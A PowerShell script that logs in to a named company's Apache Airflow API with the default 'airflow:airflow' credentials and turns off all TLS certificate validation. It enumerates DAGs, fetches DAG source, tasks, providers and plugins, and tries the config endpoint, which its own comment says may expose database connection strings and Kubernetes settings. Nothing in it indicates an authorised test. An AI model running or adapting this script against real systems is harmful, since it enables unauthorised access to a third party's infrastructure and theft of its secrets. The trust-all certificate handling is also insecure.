Add-Type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAll : ICertificatePolicy {
    public bool CheckValidationResult(ServicePoint sp, X509Certificate cert, WebRequest req, int problem) { return true; }
}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAll
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

$base = "https://dev-airflow.kbfinansia.com"
$encoded = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("airflow:airflow"))

function AF-Get($path) {
    try {
        $req = [System.Net.WebRequest]::Create("$base$path")
        $req.Method = "GET"
        $req.Headers.Add("Authorization", "Basic $encoded")
        $resp = $req.GetResponse()
        $r = New-Object System.IO.StreamReader($resp.GetResponseStream())
        return $r.ReadToEnd()
    } catch [System.Net.WebException] {
        if ($_.Exception.Response) {
            $r = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
            return "ERR:" + $r.ReadToEnd()
        }
        return "EXC:" + $_.Exception.Message
    }
}

function AF-Post($path, $body) {
    try {
        $req = [System.Net.WebRequest]::Create("$base$path")
        $req.Method = "POST"
        $req.ContentType = "application/json"
        $req.Headers.Add("Authorization", "Basic $encoded")
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($body)
        $req.ContentLength = $bytes.Length
        $s = $req.GetRequestStream(); $s.Write($bytes,0,$bytes.Length); $s.Close()
        $resp = $req.GetResponse()
        $r = New-Object System.IO.StreamReader($resp.GetResponseStream())
        return $r.ReadToEnd()
    } catch [System.Net.WebException] {
        if ($_.Exception.Response) {
            $r = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
            return "ERR:" + $r.ReadToEnd()
        }
        return "EXC:" + $_.Exception.Message
    }
}

# Get all DAGs
Write-Host "=== ALL DAGS ==="
$dagsJson = AF-Get "/api/v1/dags?limit=100"
Write-Host $dagsJson

# Parse and list DAG IDs
try {
    $dags = $dagsJson | ConvertFrom-Json
    Write-Host "`n=== DAG IDs ==="
    foreach ($dag in $dags.dags) {
        Write-Host "$($dag.dag_id) | is_active=$($dag.is_active) | is_paused=$($dag.is_paused)"
    }
} catch {}

# Get dbdocs source file
Write-Host "`n=== DBDOCS DAG SOURCE ==="
Write-Host (AF-Get "/api/v1/dagSources/.eJxT0s8vKNFPzCxKy8kv109JTC_WT0lKyU8ujk8qzcxJiU9Jys2JT6nMS8zNTMYto1dQqQQAHWkcbQ.cjN1Cn_noKb-noaGqugUPwtGI8w")

# Get dbdocs tasks 
Write-Host "`n=== DBDOCS TASKS ==="
Write-Host (AF-Get "/api/v1/dags/dbdocs_build_dbml_dynamic/tasks")

# Get providers
Write-Host "`n=== PROVIDERS ==="
Write-Host (AF-Get "/api/v1/providers")

# Get plugins
Write-Host "`n=== PLUGINS ==="
Write-Host (AF-Get "/api/v1/plugins")

# Try to get Airflow config (may expose DB conn string, K8s config, etc.)
Write-Host "`n=== CONFIG (may need admin) ==="
Write-Host (AF-Get "/api/v1/config")
